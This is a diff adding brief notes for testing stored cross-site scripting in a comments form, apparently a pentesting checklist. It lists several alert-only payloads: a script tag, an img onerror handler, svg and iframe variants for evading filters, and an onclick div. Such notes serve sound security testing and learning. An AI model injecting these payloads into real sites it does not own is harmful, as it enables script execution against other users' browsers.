@@ -1,0 +1,21 @@
+// stored xss attack
+
+1. in the comments form, add a comment with a script in it:
+<script>alert("xss attack")</script>
+
+2. Using HTML Attributes and Event Handlers
+Another approach involves injecting JavaScript via HTML attributes:
+<img src="invalid.jpg" onerror="alert('Stored XSS #2')">
+add the image to the comments input form
+
+3. Polymorphic or Variation Payloads:
+web filters might block the literal <script> tag but allow other forms
+<svg><script>alert('Stored XSS #3')</script></svg>
+or
+<iframe src="javascript:alert('Stored XSS #4')"></iframe>
+
+4. Testing for HTML Injection vs. JavaScript Execution
+if <script> tags are blocked, might be able to do HTML injection or partial injection of attributes:
+<div onclick="alert('Stored XSS via onclick')">
+  Click me
+</div>
